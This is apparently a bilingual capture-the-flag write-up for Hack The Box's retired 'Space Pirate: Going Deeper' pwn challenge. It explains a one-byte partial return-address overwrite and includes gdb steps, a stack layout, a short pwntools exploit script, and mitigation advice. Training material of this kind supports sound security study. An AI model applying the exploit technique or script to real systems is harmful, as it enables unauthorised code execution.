---
challenge: "Space Pirate: Going Deeper"
category: Challenge
type: pwn
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, partial-overwrite, x86-64, pwntools, gdb]
---

# Space Pirate: Going Deeper — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired based on public writeups; not verified with an HTB session.
> No flags or real instance addresses.

## TL;DR

`admin_panel()` reserves 40 bytes and reads 57: a one-byte stack overflow over the return address. The binary has neither PIE nor canary, so changing the low byte of the return address is enough to jump into the branch that runs `system("cat flag*")`. The payload is 56 filler bytes and `\x01`.

## Brief and surface

- **Pwn** category, **Very Easy** difficulty, x86-64 ELF and a remote instance.
- Menu with three options: disable mechanisms, log in or exit.
- The hint is in the printed values: `a = [1], b = [2], c = [3]`, while the function compares against `0xdeadbeef`, `0x1337c0de` and `0x1337beef`.

```bash
file sp_going_deeper
checksec --file=sp_going_deeper
```

```text
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

"No canary, no PIE" turns a single overflow byte into control flow.

## Recon

```text
 1. Disable mechanisms ⚙️
 2. Login ✅
 3. Exit 🏃
 >>
```

The first two options reach the same `read(0, local_38, 0x39)`; the third exits. The binary is not stripped, so `admin_panel` shows up by name.

```bash
objdump -d -M intel sp_going_deeper | sed -n '/<admin_panel>:/,/^$/p'
```

## Source analysis

The function takes three parameters and compares them with constants:

```c
void admin_panel(long a, long b, long c) {
    char local_38[40];
    long local_10 = 0;
    ...
    read(0, local_38, 0x39);          // 57 bytes into a 40-byte buffer

    if (a == 0xdeadbeef && b == 0x1337c0de && c == 0x1337beef) {
        if (strncmp("DRAEGER...", local_38, 0x34) != 0) {
            printf("[+] Welcome admin! ...");
            system("cat flag*");
        }
    }
}
```

- `a`, `b` and `c` arrive as `1`, `2` and `3` from `main`, never as the constants: that path is impossible.
- The password comparison is inverted (`!= 0` enters the block), but it is unreachable too.
- `read` is exploitable: 57 bytes into a 40-byte buffer overflow 17 bytes of the frame.

## The bug

`admin_panel` places the buffer at `rbp-0x30` and the return address at `rbp+0x08`:

```text
rbp-0x30  [ local_38, 40 bytes ]   <- read writes 57
rbp-0x08  [ local_10, 8 bytes ]
rbp+0x00  [ saved RBP, 8 bytes ]
rbp+0x08  [ return address    ]    <- low byte controllable
```

Ghidra names it `local_38`, but the disassembly places it at `rbp-0x30`; the offset is measured from there. 40 bytes fill the buffer, 8 cover `local_10` and 8 the saved RBP, and byte 56 (the 57th) hits the least significant byte of the return address. The original return points to `0x400ba0` (the instruction after the call in `main`); changing that byte to `0x01` jumps to `0x400b01`, inside the branch that prints the message and runs `system`.

No canary to bypass (none), no PIE to leak (none), no ROP: this is a **partial overwrite** of one byte.

## Local reproduction

```bash
gdb -q ./sp_going_deeper
```

```gdb
run
# option 1, then a 100-byte cyclic pattern
pattern create 100
pattern search $rsp
```

The offset to the return address is 56. To confirm the target:

```bash
objdump -d sp_going_deeper | grep -A2 "400afa\|400b01"
```

`0x400afa` is the alternative branch that also calls `printf`; `0x400b01` loads the welcome message. Either works if the low byte matches.

## Exploitation

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = '<IP>', <PORT>
p = remote(HOST, PORT)

p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b': ', b'A' * 56 + b'\x01')
print(p.recvall(timeout=5).decode(errors='replace'))
```

- The filler must be exactly 56 bytes: 40 buffer + 8 `local_10` + 8 saved RBP.
- `b'\x01'` replaces only the low byte; the five high bytes of the address are unchanged.
- A rebuilt binary moves the branch address and the byte must be recalculated.
- Do not put a newline inside the binary payload: `sendlineafter` appends `\n` after the 57 bytes.

The expected result is the welcome message and the output of `cat flag*`.

## Evidence

- `checksec` with `No canary` and `No PIE`.
- Offset 56 confirmed with `pattern search` on `$rsp`.
- Local output with a test flag, never the real one.

## Lessons learned

- One overflow byte is enough when the binary has no PIE: the full address does not need rewriting.
- The 57-byte `read` into a 40-byte buffer is the real bug; the impossible parameter check is a decoy.
- There are 16 bytes between buffer and return address (`local_10` and saved RBP), not 8; miscounting shifts the payload.
- `sendlineafter` adds an extra byte: in a binary payload, know where it lands.
- The success branch sits one byte away from the original return; reading the disassembly saves a whole ROP chain.

## Mitigations and detection

- Replace `read(0, buf, 0x39)` with `read(0, buf, sizeof(buf))`.
- Build with `-fstack-protector-strong` and `-pie -fPIE`; the canary would have stopped the overflow and PIE would have forced a leak.
- Do not leave branches that run commands with the flag behind unreachable comparisons.
- Detection: crashes with `RIP` inside the binary after a 57-byte input; requests with 56 filler bytes and one control byte.
- References: CWE-121 (stack-based buffer overflow), MITRE T1190.

## References

- <https://7rocky.github.io/en/ctf/htb-challenges/pwn/space-pirate-going-deeper/>
- <https://www.hackthebox.com/blog/space-pirate-going-deeper-ca-ctf-2022-pwn-writeup>
- <https://cwe.mitre.org/data/definitions/121.html>
- <https://docs.pwntools.com/en/stable/tubes.html>
